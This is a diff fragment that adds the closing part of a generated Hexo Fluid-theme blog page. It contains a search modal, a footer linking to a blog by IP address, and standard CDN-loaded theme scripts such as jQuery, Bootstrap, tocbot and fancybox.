+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="http://140.210.217.83/" target="_blank" rel="nofollow noopener"><span>推荐</span></a> <i class="iconfont icon-love"></i> <a href="http://140.210.217.83/" target="_blank" rel="nofollow noopener"><span>博客</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
